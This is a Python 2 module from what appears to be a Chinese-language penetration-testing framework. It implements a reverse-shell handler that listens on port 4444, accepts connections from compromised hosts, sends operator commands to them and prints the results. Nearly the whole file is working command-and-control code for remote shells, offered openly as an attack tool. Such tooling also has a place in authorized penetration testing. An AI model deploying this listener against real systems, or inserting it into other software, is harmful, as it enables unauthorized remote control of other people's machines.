#! /usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys


#模块使用说明
docs = '''

#==============================================================================
#title                  :hander
#description            :shell hander
#author                 :mosin
#date                   :20170712
#version                :0.1
#usage                  pl-shell> back    #返回监听状态
                        pl-shell> qiut    #退出监听，返回框架
#python_version         :2.7.5

#==============================================================================

'''

from modules.exploit import BGExploit
from socket import *


class PLScan(BGExploit):
    
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "监听",  # 该POC的名称
            "product": "Hander",  # 该POC所针对的应用名称,
            "product_version": "1.0",  # 应用的版本号
            "desc": '''
            用于监听反弹过来的shell

            ''',  # 该POC的描述
            "author": ["mosin"],  # 编写POC者
            "ref": [
                {self.ref.url: ""},  # 引用的url
                {self.ref.bugfrom: ""},  # 漏洞出处
            ],
            "type": self.type.rce,  # 漏洞类型
            "severity": self.severity.high,  # 漏洞等级
            "privileged": False,  # 是否需要登录
            "disclosure_date": "2017-07-17",  # 漏洞公开时间
            "create_date": "2017-07-17",  # POC 创建时间
        }

        #自定义显示参数
        self.register_option({
            "target": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "监听地址",
                "Required":"no"
            },
            "port": {
                "default": 4444,
                "convert": self.convert.int_field,
                "desc": "监听端口",
                "Required":"no"
            },
            "debug": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "用于调试，排查poc中的问题",
                "Required":"",
            },
            "mode": {
                "default": "payload",
                "convert": self.convert.str_field,
                "desc": "执行exploit,或者执行payload",
                "Required":""
            }
        })
        
        #自定义返回内容
        self.register_result({
            #检测标志位，成功返回置为True,失败返回False
            "status": False,
            "exp_status":False, #exploit，攻击标志位，成功返回置为True,失败返回False
            #定义返回的数据，用于打印获取到的信息
            "data": {

            },
            #程序返回信息
            "description": "",
            "error": "hander error"
        })


    def payload(self):
        HOST   = self.option.target['default']
        PORT   = self.option.port['default']
        BUFSIZ = 2048
        ADDR   = (HOST, PORT)
        sock   = socket(AF_INET, SOCK_STREAM)
        sock.bind(ADDR)
        sock.listen(5)
        STOP_CHAT = False
        
        #开始监听
        try:
            print "Hander Listening %s port:%s" %(HOST,PORT)
            while not STOP_CHAT:
                client, addr = sock.accept()
                print('Start Listening %s  port %s.....') %(addr,PORT)
                
                while True:
                    data = raw_input('pl-shell >')
                    try:
                        client.send(data.encode('utf-8'))
                        if data.upper()=="BACK":
                            break
                        os_result = client.recv(BUFSIZ)
                        if not os_result:
                            client.close()
                            break
                    except:
                        client.close()
                        break
                    STOP_CHAT = (data.decode('utf8').upper()=="QUIT")
                    if STOP_CHAT:
                        break
                    print(os_result)
        except (KeyboardInterrupt):
            client.close()
            sock.close()
            
    def exploit(self):
        pass


#下面为单框架程序执行，可以省略
if __name__ == '__main__':
    from main import main
    main(PLScan())

















